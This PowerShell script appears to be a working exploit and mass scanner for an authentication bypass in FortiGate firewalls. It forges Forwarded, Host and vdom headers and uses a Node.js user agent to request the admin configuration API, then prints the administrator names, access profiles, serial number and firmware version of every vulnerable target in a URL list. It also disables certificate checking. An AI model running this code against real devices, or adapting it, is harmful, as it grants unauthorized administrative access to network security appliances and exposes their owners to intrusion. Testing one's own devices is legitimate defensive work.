Param(
        [string[]]$urlsfile,
        [string[]]$fgt
)

# Skip Certificate Check
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy



if ($fgt){
    $headers = @{
        'accept-encoding'='gzip,deflate'
        'Host'='127.0.0.1:9980'
        'forwarded'='by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host='
        'x-forwarded-vdom'='root'
     }
    
    Write-Host "Checking:" $fgt
    $request = 0
try{
    $request = Invoke-WebRequest -URI $fgt/api/v2/cmdb/system/admin -Method 'GET' -UserAgent Node.js -Headers $headers
    $StatusCode = $request.StatusCode
} catch {
    $StatusCode = $_.Exception.Response.StatusCode.value__
}


if ($StatusCode -eq 401){
    Write-Host "The target is not vulnerable"
    write-host "`n"
}
elseif ($StatusCode -eq $null){
    Write-Host "Can't reach target"
    write-host "`n"

}
else {
    
    $data = $request.content | ConvertFrom-Json
    
    $data.results | Format-Table -Property Name, accprofile
    
    
    Write-Host "Serial:" $data.serial 
    Write-Host "Version:" $data.version
    Write-Host "Build:" $data.build
}}
else {
$urls = Get-Content $urlsfile
foreach($url in $urls){

$headers = @{
    'accept-encoding'='gzip,deflate'
    'Host'='127.0.0.1:9980'
    'forwarded'='by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host='
    'x-forwarded-vdom'='root'
 }

Write-Host "Checking:" $url
$request = 0
try{
$request = Invoke-WebRequest -URI $url/api/v2/cmdb/system/admin -Method 'GET' -UserAgent Node.js -Headers $headers
$StatusCode = $request.StatusCode
} catch {
    $StatusCode = $_.Exception.Response.StatusCode.value__
}


if ($StatusCode -eq 401){
    Write-Host "The target is not vulnerable"
    write-host "`n"
}
elseif ($StatusCode -eq $null){
    Write-Host "Can't reach target"
    write-host "`n"

}
else {
$data = $request.content | ConvertFrom-Json

$data.results | Format-Table -Property Name, accprofile


Write-Host "Serial:" $data.serial 
Write-Host "Version:" $data.version
Write-Host "Build:" $data.build
write-host "`n"
}}}
